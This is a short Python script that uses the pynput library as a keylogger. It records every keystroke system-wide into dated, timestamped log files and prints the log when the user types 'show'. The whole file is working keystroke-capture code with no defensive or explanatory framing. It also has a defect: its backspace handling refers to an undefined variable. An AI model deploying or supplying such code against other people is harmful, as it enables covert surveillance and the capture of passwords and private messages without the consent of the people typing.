from pynput import keyboard
from datetime import datetime

current_datetime = datetime.now()
current_time = current_datetime.strftime("%d-%m-%Y")
file_name = f"logs/{current_time}.txt"
current_time = current_datetime.strftime("%d/%m/%Y %H:%M")

print(current_time)
with open(file_name, "w") as file:
    file.write("\n***** " + current_time + " *****\n")

def on_press(key):
    global my_list
    try:
        tempKey = str(key.char)
    except AttributeError:
        tempKey = key
        if tempKey == keyboard.Key.backspace:
            my_list = my_list[:-1]
            return
        elif tempKey == keyboard.Key.enter:
            tempKey = '\n'
        elif tempKey == keyboard.Key.space:
            tempKey = " "
        else:
            tempKey = tempKey
    AddToFile.add_to_file(tempKey)



class AddToFile():
    def add_to_file(Key):
       global current_time
       tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
       if tempTime != current_time:
           with open(file_name, "a") as file:
               file.write("\n***** " + tempTime + " *****\n")
               current_time = tempTime
       with open(file_name, "a") as file:
           file.write(str(Key))
       data = ''
       with open(file_name, "r") as f:
           data = f.read()
       if data[-4:] == "show":
           print("\n"+data[:-4:])





listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()